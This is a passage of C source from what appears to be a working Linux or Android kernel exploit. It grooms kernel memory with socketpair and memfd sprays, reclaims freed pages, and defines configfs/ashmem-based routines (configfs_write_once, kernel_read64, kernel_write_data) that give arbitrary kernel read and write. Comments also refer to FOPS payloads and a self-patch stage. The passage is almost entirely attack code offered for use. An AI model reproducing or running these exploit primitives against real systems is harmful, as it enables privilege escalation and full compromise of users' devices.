    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /*
     * Custom write (live FOPS path) usually hits the first spray; cap
     * retries to 3 to keep the kernel dirty window short. Classic
     * non-custom diagnostics keep the full FOPS_KERNEL_PAGE_SETUP_ATTEMPTS.
     */
    if (pselect_custom_write_enabled()) {
      max_attempts = 3;
    } else {
      max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
    }
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

/* configfs ioctl/pread can hang too (run82: kernel_read_data of the
 * pipebuf slot stuck forever during the self-patch stage). Same 2s
 * SIGALRM guard as pipe_timed_read — EINTR makes the op fail cleanly
 * instead of wedging the exploit. */
static void cfg_alarm_nop(int sig) {
  (void)sig;
}
static void cfg_alarm_set(struct sigaction *old) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = cfg_alarm_nop;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0; /* no SA_RESTART: syscalls get EINTR */
  sigaction(SIGALRM, &sa, old);
  alarm(2);
}
static void cfg_alarm_restore(const struct sigaction *old) {
  alarm(0);
  sigaction(SIGALRM, old, NULL);
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  struct sigaction sa_old;
  cfg_alarm_set(&sa_old);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    cfg_alarm_restore(&sa_old);
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  cfg_alarm_restore(&sa_old);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  struct sigaction sa_old;
  cfg_alarm_set(&sa_old);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  pr_info("cfg rd: set_name ret=%d errno=%d page=%016zx pos=%016llx "
          "len=%zu\n",
          set_ret, set_errno, (size_t)page,
          (unsigned long long)pos, len);
  fsync(STDERR_FILENO);
  if (set_ret != 0) {
    cfg_alarm_restore(&sa_old);
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  pr_info("cfg rd: pread ret=%zd errno=%d\n", rd, rd < 0 ? errno : 0);
  cfg_alarm_restore(&sa_old);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
